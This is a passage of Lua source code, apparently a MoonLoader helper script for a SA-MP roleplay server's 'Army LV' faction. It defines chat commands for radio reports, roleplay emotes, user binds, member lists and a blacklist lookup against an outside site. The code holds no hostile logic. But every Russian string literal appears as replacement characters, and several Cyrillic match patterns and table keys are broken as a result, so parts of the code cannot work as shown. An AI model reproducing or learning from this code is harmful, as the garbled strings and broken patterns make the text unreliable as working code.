				config_ini.bools[33] = togglebools.tab_overlay[9].v and 1 or 0
				config_ini.bools[34] = togglebools.tab_overlay[10].v and 1 or 0
				config_ini.bools[35] = togglebools.tab_overlay[11].v and 1 or 0
				config_ini.bools[36] = togglebools.tab_overlay[12].v and 1 or 0
				config_ini.bools[41] = togglebools.tab_overlay[15].v and 1 or 0
				config_ini.bools[43] = togglebools.tab_overlay[16].v and 1 or 0
				config_ini.bools[44] = togglebools.tab_overlay[17].v and 1 or 0
				config_ini.bools[52] = togglebools.tab_overlay[18].v and 1 or 0
				config_ini.bools[54] = togglebools.tab_overlay[19].v and 1 or 0
				config_ini.bools[58] = togglebools.tab_moder[1].v and 1 or 0
				SetMode, SetModeFirstShow, imgui.ShowCursor, imgui.LockPlayer = false, false, false, false
				needtosave = true
				--s_target, s_targetCar, s_hp, s_veh, s_name, s_place, s_time, s_rk, s_afk, s_tecinfo, s_500, s_dind, s_dam, s_death, s_money
		end
end

function cmd_ob(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[1] .. " [����������] [�������/0 - ������� �������] [1-3]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local zzz = {[1] = "��������� ������������", [2] = "��� �������� �������������", [3] = "��� �������� �������������", [4] = "������ �������� �������������", [5] = "���� ��������� �������������", [6] = "����� ��������� �������������", [7] = "���� ��������� �������������", [8] = "������ ��������� �������������", [9] = "������ ��������� �������������", [10] = "������ ��������� �������������"}
		if tonumber(params[1]) == nil or zzz[tonumber(params[1])] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ���������� ���������.", 0xFFFF0000) return end
		local kol = tonumber(params[1])
		if params[2] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
		local b, n = params[2]:match("([�-�])-(%d+)")
		if (b == nil or (tonumber(n) < 1 or tonumber(n) > 24)) and (tonumber(params[2]) ~= 0) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
		local kv = tonumber(params[2]) == 0 and kvadrat() or "" .. b .. "-" .. n .. ""
		if tonumber(params[3]) == nil or (tonumber(params[3]) < 1 or tonumber(params[3]) > 3) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������� �3.", 0xFFFF0000) return end

		local obdokl = "/r " .. tag .. " " .. zzz[kol] ..  ""
		local obdokl2 = " � �������� " .. kv .. "."
		local obdokl3
		if tonumber(params[3]) == 2 then obdokl3 = "" elseif tonumber(params[3]) == 3 or kol == 1 then obdokl3 = " �������� ������" elseif tonumber(params[3]) == 1 and kol > 1 then obdokl3 = " ��������� �������" end
		local dokl = obdokl .. obdokl2 .. obdokl3
		sampSendChat(dokl)
end

function cmd_sopr(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[2] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local x, y, z = getCharCoordinates(PLAYER_PED)
		local zone = calculateZone(x, y, z)
		local arr = {
				["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
				["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
				["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
				["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
				["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
				["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		if zone == "Restricted Area" then
				if sparams == "0" then sampSendChat("/f " .. tag .. " ������� � ������������� ���") return end
				sampSendChat("/f " .. tag .. " ������� � ������������� ������ ��� �� " .. arr[sparams] .. "")
		else
				if sparams == "0" then sampSendChat("/f " .. tag .. " ������� �������, ������������") return end
				sampSendChat("/f " .. tag .. " ������� ������� � �������� " .. kvadrat() .. ", ������������ �� " .. arr[sparams] .. "")
		end
end

function cmd_zgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[3] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local arr = {
				["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
				["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
				["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
				["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
				["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
				["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
				["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		local kv = kvadrat()
		lastKV.m = kv
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000)
		if sparams == "0" then sampSendChat("/f " .. tag .. " ������� ��������, ����� ������") return end
		sampSendChat("/f " .. tag .. " ������� �������� � �������� " .. kv .. ", ����� " .. arr[sparams] .. "")
end

function cmd_rgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[4] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local arr = {
				["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
				["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
				["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
				["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
				["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
				["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
				["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		if sparams == "0" then sampSendChat("/f " .. tag .. " ��������������� ��������, ����� ������") return end
		sampSendChat("/f " .. tag .. " �������� � �������� " .. kvadrat() .. " �������������� � ���������� ���� " .. arr[sparams] .. "")
end

function cmd_bgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[5] .. " [mkv - ��������� �������/�������]", 0xFFFF0000) return end
		local kv = ""
		if sparams == "mkv" then if lastKV.m ~= "" then kv = lastKV.m lastKV.m = "none" else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������", 0xFFFF0000) return end end
		if kv == "" then
				local b, n = sparams:match("([�-�])-(%d+)")
				if (b == nil or (tonumber(n) < 1 or tonumber(n) > 24)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
				kv = "" .. b .. "-" .. n .. ""
		end

		sampSendChat("/f " .. tag .. " �������� � �������� " .. kv .. " ��������� �� ����")
end

function cmd_kv(sparams)
		if sparams == "" or (sparams ~= "0" and sparams ~= "1") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[6] .. " [0 - �������/1 - ����]", 0xFFFF0000) return end
		local d = sparams == "0" and "�������. ���������� ������� ��������������" or "����. ���������� ������� �� ����������"
		sampSendChat("/f " .. tag .. " ������� " .. kvadrat() .. " " .. d .. "")
end

function cmd_e(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[7] .. " [0 - ������� �����(��)/1 - ��������� �����(��)]", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == "0" then
				if params[2] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /" .. config_ini.Commands[7] .. " 0 [id1] ([id2]) ([id3])", 0xFFFF0000) return end
				local kv = kvadrat()
				lastKV.b = kv
				local d = "/r " .. tag .. " ������� ����"
				local d2 = ""
				local d3 = ""
				if params[3] ~= nil then
						d2 = "�� � �������� " .. kv .. ". ������: " .. params[2] .. " " .. params[3] .. ""
						d3 = params[4] ~= nil and " " .. params[4] .. "" or ""
						lastID.e = "" .. params[2] .. " " .. params[3] .. "" .. d3 .. ""
				else
						d2 = "� � �������� " .. kv .. ". �����: " .. params[2] .. ""
						lastID.e = params[2]
				end

				sampSendChat(d .. d2 .. d3)
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.b .. ", ID: " .. lastID.e .. ".", 0xFFFF0000)
				return
		end

		if params[1] == "1" then
				if params[2] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /" .. config_ini.Commands[7] .. " 1 [������ ����./bkv - ����. ���. ��.] [���� ����./0 - ���. ��.] [lej - ����. ���. id/[id1] ([id2]) ([id3])]", 0xFFFF0000) return end
				local kv = ""
				if params[2] == "bkv" then if lastKV.b == "none" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������", 0xFFFF0000) return else kv = lastKV.b lastKV.b = "none" end end
				kv = kv == "" and params[2] or kv
				local dkv = params[3] == "0" and kvadrat() or params[3]
				local ids = ""
				if params[4] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ID.", 0xFFFF0000) return end
				if params[4] == "lej" then if lastID.e ~= "none" then ids = lastID.e lastID.e = "none" else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ��������� �������� id", 0xFFFF0000) return end end
				if ids == "" then ids = params[4] if params[5] ~= nil then ids = "" .. params[4] .. " " .. params[5] .. "" end if params[6] ~= nil then ids = "" .. params[4] .. " " .. params[5] .. " " .. params[6] .. "" end end
				local d = ""
				if ids:len() > 3 then d = "/r " .. tag .. " ����� � " .. kv .. " ���������� � " .. dkv .. ". ������: " .. ids .. "" else d = "/r " .. tag .. " ���� � " .. kv .. " ��������� � " .. dkv .. ". �����: " .. ids .. "" end
				sampSendChat(d)
				return
		end
end

function cmd_r(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[9] .. " [�����]", 0xFFFF0000) return end
		local t = strunsplit(sparams, 80)
		isSending = true
		lua_thread.create(function() for k, v in ipairs(t) do sampSendChat("/f " .. tag .. " " .. v .. "") wait(1300) end isSending = false end)
end

function cmd_pr(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[10] .. " [�������/�����]", 0xFFFF0000) return end
		sampSendChat("/f " .. tag .. " �������, " .. sparams .. "!")
end


function cmd_gr(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[12] .. " [flash/shock/he/smoke/inc/tear]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}flash - �����-�������, shock - �������, he - ����������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}smoke - �������, inc - �������������, tear - �� ������������ �����", 0xFFFF0000) return end
						local tarr = {["flash"] = "������������ ������� \"�-84\"", ["shock"] = " ������� ������� \"SRBG\"", ["smoke"] = "������� ������� \"M308-1\"", ["inc"] = "������������� ������� \"M14 TH3\"", ["tear"] = "������� �� ������������ ����� \"���-2�\"", ["he"] = "���������� ������� \"���-5\""}
						if tarr[sparams] ~= nil then gr = tarr[sparams] sampSendChat("/me ������" .. RP .. " " .. gr .. " � ����� ��� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����") wait(delay) sampSendChat("/me ������" .. RP .. " " .. gr .. " ������ ��� ����") else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����������� �������", 0xFFFF0000) end
				end
		)
end

function cmd_hit()
		lua_thread.create(
				function()
						wait(0)
						local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED))
						local weap = otWeaponName[2][weapid]
						local rr = RP == "" and "" or "��"
						if weap ~= nil then sampSendChat("/me �����" .. rr .. " ���� �� ������ ������ ��������� " .. weap .. "") wait(delay) sampSendChat("/do ������ �������� ��������") wait(delay) sampSendChat("/me ����� ������ �� ����")else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������ � ��������� � ����.", 0xFFFF0000) end
				end
		)
end

function cmd_cl(sparams)
		lua_thread.create(
				function()
						wait(0)
						if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 33 then
								local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
								local myclist = clists[sampGetPlayerColor(myid)]
								if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if sparams == myclist then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���� ������ ���� �����.", 0xFFFF0000) return end
								local res, sid = sampGetPlayerSkin(myid)
								if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ������ �����", 0xFFFF0000) return end
								if ((sid == 287 or sid == 191) and myclist ~= 7 and myclist ~= 0) or (myclist ~= 0 and (sid ~= 287 and sid ~= 191)) then
										sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
										wait(1300)
								end

								sampSendChat("/clist " .. sparams .. "")
								if ((tonumber(sparams) == 7) and ((sid == 287) or (sid == 191))) or (tonumber(sparams) == 0) then return end

								wait(1300)
								sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[tonumber(sparams)] .. "")
						else
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[14] .. " [0-33]", 0xFFFF0000)
						end
				end
		)
end

function cmd_memb(sparams)
		lua_thread.create(
				function()
						wait(0)
						if sparams == "" or tonumber(sparams) == nil or (tonumber(sparams) < 0 or tonumber(sparams) > 999) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[16] .. " [id]", 0xFFFF0000) return end
						local id = tonumber(sparams)
						if not sampIsPlayerConnected(tonumber(id)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������.", 0xFFFF0000) return end

						local Members1Text = getMembersText()
						local nick = sampGetPlayerNickname(id)
						local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
						local clist = clist == "ffff" and "fffafa" or clist
						for v in Members1Text:gmatch('[^\n]+') do
								local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
								if zv ~= nil then afk = afk == nil and "" or afk sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- " .. zv .. " " .. afk .. "", 0xFFFF0000) return end
						end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000)
				end
		)
end

function cmd_chs(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[17] .. " [id]", 0xFFFF0000) return end
						local id = -1
						if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 999  then id = tonumber(sparams) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(sparams)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and sparams or sampGetPlayerNickname(tonumber(sparams))
						local url = 'http://srp-addons.ru/api/log.php?checkbl=' ..  nick .. '&f=Army%20LV&s=95.181.158.64:7777'
						local responsetext = u8:decode(decodebase64(req(url)))
						local reas, when, who = responsetext:match("\"reason\":\"(.*)\",\"date\":\"(.*)\",\"user\":\"(.*)\"")
						if reas ~= nil then
								sampAddChatMessage("{FF8300}-----------=== ������ ������ Las-Venturas army ===-----------", 0xFFFF0000)
								sampAddChatMessage("{FF8300}�����: {FFFFFF}" .. nick .. " [" .. id .. "]{FF0000} ������ � ������ ������", 0xFFFF0000)
								sampAddChatMessage("{FF8300}�������: {FFFFFF}" .. reas .. "", 0xFFFF0000)
								sampAddChatMessage("{FF8300}��� ����: {FFFFFF}" .. who .. "", 0xFFFF0000)
								sampAddChatMessage("{FF8300}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
					 	else
								sampAddChatMessage("{FF8300}Black List: �����: {FFFFFF}" .. nick .. " [" .. id .. "]{33AA33} � ������ ������ �� ������", 0xFFFF0000)
						end
				end
		)
end

function cmd_bugreport(sparams)
		lua_thread.create(
				function()
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /bugreport [�����]", 0xFFFF0000) return end
						sendtolog(sparams, 0)
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��������� ���� ������� ����������", 0xFFFF0000)
				end
		)
end

function cmd_mp(sparams)
		lua_thread.create(
				function()
						if sparams ~= "load" and sparams ~= "unload" and sparams ~= "sdok" and sparams ~= "vdok" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[18] .. " [load/unload/sdok/vdok]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}load - �������� �������� ���������; unload - �������� ��������� ���������", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}sdok - ������ � ��������� ������ �� ������� ������������; vdok - ������ � ������/��������", 0xFFFF0000) return end
						wait(0)
						if sparams == "load" then sampSendChat("/me ����" .. RP .. " ����� �� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����� � ��������") end
						if sparams == "unload" then sampSendChat("/me ����" .. RP .. " ����� � ���������") wait(delay) sampSendChat("/me ���������" .. RP .. " ����� �� �����") end
						if sparams == "sdok" then
								local A_Index = 0
								while true do
										if A_Index == 30 then break end
										local text = sampGetChatString(99 - A_Index)
										local sklad, kol = text:match(" �� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
										if sklad ~= nil then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. sklad .. ", " .. kol .. " ����. ") return end
										A_Index = A_Index + 1
								end
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������� ��������", 0xFFFF0000)
						end

						if sparams == "vdok" then
								local X, Y = getCharCoordinates(playerPed)
								if X >= 276 and Y >= 1799 and X <= 389 and Y <= 2014 then
										sampSendChat("/f " .. tag .. " �����, ��������, �������� ���")
								else
										sampSendChat("/f " .. tag .. " �����, ��������, ���������� ���")
								end
						end
				end
		)
end

function cmd_z(sparams)
		lua_thread.create(
				function()
					wait(0)
					if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[19] .. " [�����]", 0xFFFF0000) return end
					local A_Index = 0
							while true do
									if A_Index == 30 then break end
									local text = sampGetChatString(99 - A_Index)
									local re1 = regex.new("SMS:(.*). �����������: (.*)_(.*)\\[(.*)\\]")
									local _, _, _, smsdid = re1:match(text)
									if smsdid ~= nil then sampSendChat("/t " .. smsdid .. " " .. sparams .. "") return end
									A_Index = A_Index + 1
							end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}SMS �� ������.", 0xFFFF0000)
				end
		)
end

function cmd_mem1()
	lua_thread.create(function()
		mem1 = {[1] = {}, [2] = {}, [3] = {}, [4] = {}, [5] = {}}
		local Members1Text = getMembersText()
		for v in Members1Text:gmatch('[^\n]+') do
			local n, id, fname, sname, zv, rank, afk = v:match("%[(%d+)%] %[(%d+)%] (%a+)_(%a+)	(%W*) %[(%d+)%](.*)")
			if n ~= nil then
				local afk = afk == nil and "" or afk
				local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				local clist = clist == "ffff" and "fffafa" or clist
				local zvcol = tonumber(rank) >= 12 and "00BFFF" or (rank == 1 and clist == "fffafa") and "ff0000" or "fffafa"
				table.insert(mem1[1], n)
				table.insert(mem1[2], id)
				table.insert(mem1[3], "{" .. clist .. "}" .. fname .. "_" .. sname .. "")
				table.insert(mem1[4], "{" .. zvcol .. "}" .. zv .. "[" .. rank .. "]")
				table.insert(mem1[5], afk)
			end
		end

		show.show_mem1.v = true
	end)
end

function cmd_st(sparams)
		local hour = tonumber(sparams)
		if hour ~= nil and hour >= 0 and hour <= 23 then
				time = hour
				patch_samp_time_set(true)
		else
				patch_samp_time_set(false)
				time = nil
		end
end

function cmd_afk()
		afkstatus = not afkstatus
		local s = afkstatus and "�������" or "��������"
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ��� ������� " .. s .. ".", 0xFFFF0000)
		local offset = 3600 * tonumber(config_ini.Settings.timep)
		sampSendChat("/fs " .. (afkstatus and "sq_message_id_1_" .. (os.time() - offset) .. "" or "sq_message_id_2") .. "")
end

function cmd_sw(sparams)
		local weather = tonumber(sparams)
	  if weather ~= nil and weather >= 0 and weather <= 45 then
	    	forceWeatherNow(weather)
	  end
end

function cmd_mcall(sparams)
		lua_thread.create(
				function()
						wait(0)
						sampSendChat("/dir")
						--wait(delay)
						while not sampIsDialogActive() do wait(0) end
						sampSendDialogResponse(sampGetCurrentDialogId(), 1, 1)
						while sampGetDialogCaption() ~= "������" do wait(0) end
						wait(100)
						sampCloseCurrentDialogWithButton(1)
						while sampGetDialogCaption() ~= "����" do wait(0) end
						local MechanicksText = sampGetDialogText()
						sampCloseCurrentDialogWithButton(0) wait(100) sampCloseCurrentDialogWithButton(0) wait(100) sampCloseCurrentDialogWithButton(0)
						for v in MechanicksText:gmatch('[^\n]+') do
    						local n, fname, sname, id, numb, afk = v:match("%[(%d+)%] (%a+)_(%a+)%[(%d+)%]	(%d+)(.*)")
    						if n ~= nil then
										if sparams ~= "" and sparams ~= id then sampSendChat("/t " .. id .. " ���, ������� ������ �� �����.") wait(1300) end
										if sparams == "" then sampSendChat("/t " .. id .. " ����� ������� � �������� " .. kvadrat() .. ", �� ��� �����!") wait(1300) end
								end
						end
				end
		)
end

function cmd_showp(sparams)
		lua_thread.create(
					function()
							wait(0)
							if tonumber(sparams) ~= nil and tonumber(sparams) >= 0 and tonumber(sparams) <= 999 then sampSendChat("/showpass " .. sparams .. "") wait(delay) end
							sampSendChat("/me �������" .. RP .. " ������������� � �������� ����")
							wait(delay)
							isSending = true
							sampSendChat("/do � �������������: Army LV | " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. " | " .. config_ini.Settings.PlayerRank .. " | " .. PlayerU .. "")
							isSending = false
						end
			)
end

function cmd_u1()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[1])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u2()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[2])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u3()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[3])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u4()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[4])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u5()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[5])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u6()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[6])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u7()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[7])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u8()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[8])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u9()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[9])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u10()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[10])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u11()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[11])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u12()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[12])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u13()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[13])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u14()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[14])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u15()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[15])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u16()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[16])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u17()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[17])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_u18()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserCBinder[18])
						if SB == nil then return end
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function cmd_dokhelp()
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA/" .. config_ini.Commands[1] .. " [����������] [�������/0 - ���. �������] [1-3] - �������� � ���������� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[2] .. " [����� ����������/0 - �����] - �������� � ������ ������������� �������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/" .. config_ini.Commands[3] .. " [����� ����������/0 - �����] - �������� � ��������� ��������� ���������", 0xFFFF0000)
	sampAddChatMessage("{FF0000}[LUA]: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
